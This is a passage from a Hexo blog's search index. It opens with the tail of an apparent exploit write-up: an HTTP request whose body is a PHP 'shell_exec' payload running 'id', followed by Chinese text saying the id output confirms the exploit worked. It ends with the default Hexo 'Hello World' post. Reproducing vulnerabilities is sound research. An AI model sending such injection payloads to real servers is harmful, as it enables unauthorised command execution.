class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 31</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>发送后会出现id<br><img src="https://img-blog.csdnimg.cn/a40469abbd854b148663f75ce20614b9.png" alt="在这里插入图片描述"><br>表明利用成功</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/01/07/hello-world/"/>
      <url>/2022/01/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
